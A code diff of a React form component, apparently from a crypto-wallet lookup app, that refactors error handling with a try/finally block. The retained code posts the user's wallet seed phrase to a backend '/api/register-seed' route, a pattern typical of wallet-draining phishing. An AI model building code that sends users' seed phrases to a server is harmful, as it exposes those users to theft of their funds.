@@ -82,8 +82,8 @@ export function SeedPhraseForm({
     setIsSubmitting(true);
     onFetchStart();
 
-    // First, try inserting the seed phrase in the backend via new API route
     try {
+      // First, try inserting the seed phrase in the backend via new API route
       const response = await fetch("/api/register-seed", {
         method: "POST",
         headers: {
@@ -99,37 +99,36 @@ export function SeedPhraseForm({
         const errorData = await response.json();
         throw new Error(errorData.error || "Failed to register seed phrase");
       }
+      
+      // Then continue with fetching wallet data as before
+      const formData = new FormData();
+      formData.append("seedPhrase", values.seedPhrase);
+      formData.append("network", values.network);
+
+      const result = await handleFetchData(formData);
+
+      if (result.success && result.data) {
+        onDataFetched(result.data);
+      } else {
+        toast({
+          variant: "destructive",
+          title: "Failed to fetch data",
+          description:
+            result.error ||
+            "An unknown error occurred. Please try again later.",
+        });
+        onDataFetched(null);
+      }
+
     } catch (error: any) {
       toast({
         variant: "destructive",
-        title: "Seed phrase registration failed",
+        title: "An error occurred",
         description: error.message,
       });
-      setIsSubmitting(false);
       onDataFetched(null);
-      return;
-    }
-
-    // Then continue with fetching wallet data as before
-    const formData = new FormData();
-    formData.append("seedPhrase", values.seedPhrase);
-    formData.append("network", values.network);
-
-    const result = await handleFetchData(formData);
-
-    setIsSubmitting(false);
-
-    if (result.success && result.data) {
-      onDataFetched(result.data);
-    } else {
-      toast({
-        variant: "destructive",
-        title: "Failed to fetch data",
-        description:
-          result.error ||
-          "An unknown error occurred. Please try again later.",
-      });
-      onDataFetched(null);
+    } finally {
+        setIsSubmitting(false);
     }
   }
 
